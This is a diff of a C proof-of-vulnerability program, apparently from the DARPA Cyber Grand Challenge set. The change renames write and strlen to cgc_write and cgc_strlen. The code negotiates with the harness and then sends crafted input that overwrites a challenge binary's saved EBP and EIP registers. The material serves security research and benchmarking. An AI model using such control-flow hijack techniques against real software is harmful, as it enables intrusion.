@@ -31,7 +31,7 @@ THE SOFTWARE.
 #define MAX_ENTRIES 10
 #define NEEDED_ENTRIES (MAX_ENTRIES+2)
 
-int write( int fd, void *buffer, size_t count )
+int cgc_write( int fd, void *buffer, size_t count )
 {
 	size_t written;
     int total_written;
@@ -130,7 +130,7 @@ int i;
 
 }
 
-size_t strlen( const char *str )
+size_t cgc_strlen( const char *str )
 {
 	size_t len = 0;
 	while ( *str++ != '\0' )
@@ -157,8 +157,8 @@ int i;
 	
 	temp[i] = 0;
 
-	for (i=0; i < strlen(temp); ++i) 
-		buffer[i] = temp[strlen(temp)-i-1];
+	for (i=0; i < cgc_strlen(temp); ++i) 
+		buffer[i] = temp[cgc_strlen(temp)-i-1];
 
 	buffer[i] = 0;
 
@@ -208,16 +208,16 @@ int value;
 	regnum = 5;
 
 
-	if (write(3, &pov_type, sizeof(pov_type)) == -1)
+	if (cgc_write(3, &pov_type, sizeof(pov_type)) == -1)
 		_terminate(-1);
 
-	if (write(3, &ip_mask, sizeof(ip_mask)) == -1)
+	if (cgc_write(3, &ip_mask, sizeof(ip_mask)) == -1)
 		_terminate(-1);
 
-	if (write(3, &regmask, sizeof(regmask)) == -1)
+	if (cgc_write(3, &regmask, sizeof(regmask)) == -1)
 		_terminate(-1);
 
-	if (write(3, &regnum, sizeof(regnum)) == -1)
+	if (cgc_write(3, &regnum, sizeof(regnum)) == -1)
 		_terminate(-1);
 
 	if (receive_bytes(3, &ipvalue, sizeof(ipvalue)) == -1)
@@ -247,10 +247,10 @@ int value;
 
 		buffer[4] = i + 'A';
 
-		write(1, buffer, 6);
-		write(2, buffer, 6);
+		cgc_write(1, buffer, 6);
+		cgc_write(2, buffer, 6);
 		eat_lines(1);
-		write(1, "\n", 1);
+		cgc_write(1, "\n", 1);
 		eat_lines(1);
 
 	}
@@ -264,11 +264,11 @@ int value;
 	newEBP[1] = (regvalue >> 8) & 0xff;
 	newEBP[3] = '\n';
 
-	write(1, "2\n", 2);
-	write(1, newEBP, 4);
+	cgc_write(1, "2\n", 2);
+	cgc_write(1, newEBP, 4);
 	eat_lines(1);
 
-	write(1, "\n", 1);	
+	cgc_write(1, "\n", 1);	
 
 
 	int_to_str(ipvalue, newEIP);
@@ -276,15 +276,15 @@ int value;
 
 	strcpy(buffer, "2/111/1BA/1/1/1BB/2/2/1BC/3/3/1BD/4/4/1BE/5/5/1BF/6/6/1BG/7/7/1BH/8/8/1BI/9/9/1BJ/10/10/1BK/14/14/");
 
-	write(1, buffer, strlen(buffer));
+	cgc_write(1, buffer, cgc_strlen(buffer));
 
 
-	write(1, newEBP, 3);
-	write(1, "/",1);
-	write(1, newEIP, strlen(newEIP));
-	write(1, "/0\n", 3);
+	cgc_write(1, newEBP, 3);
+	cgc_write(1, "/",1);
+	cgc_write(1, newEIP, cgc_strlen(newEIP));
+	cgc_write(1, "/0\n", 3);
 
-	write(1, "13\n", 3);
+	cgc_write(1, "13\n", 3);
 
 }
 
